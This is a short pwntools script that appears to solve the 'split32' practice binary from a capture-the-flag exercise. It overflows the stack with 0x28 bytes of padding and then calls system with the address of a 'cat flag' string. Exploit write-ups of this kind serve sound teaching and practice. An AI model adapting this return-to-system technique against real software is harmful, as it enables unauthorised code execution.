#!/usr/bin/python3

from pwn import *

PROG_NAME = "./split32"

p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
	gdb.attach(p, '''break main''')

cat_flag_addr = 0x0804a030

p.recvuntil(b'> ')

payload = b'A' * (0x20 + 0x8)
payload += p32(elf.symbols['system'])
payload += b'A' * 4 # dummy return address
payload += p32(cat_flag_addr) # argument string address

p.sendline(payload)

p.interactive()